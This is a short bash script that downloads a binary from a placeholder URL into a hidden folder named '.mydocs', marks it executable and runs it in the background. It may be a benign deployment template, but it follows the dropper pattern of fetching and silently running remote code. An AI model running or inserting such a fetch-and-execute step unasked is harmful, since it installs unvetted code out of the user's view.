#!/bin/bash

# 1. Define variables
TARGET_DIR="$HOME/.mydocs"
BINARY_URL="https://your-domain.com/binaries/agent-linux" # Link to your C++ binary
BINARY_PATH="$TARGET_DIR/agent"

# 2. Create the directory if it doesn't exist
mkdir -p "$TARGET_DIR"

# 3. Download the remote C++ program
echo "Downloading agent..."
curl -L "$BINARY_URL" -o "$BINARY_PATH"

# 4. Set permissions and run
chmod +x "$BINARY_PATH"
echo "Starting agent..."
"$BINARY_PATH" &
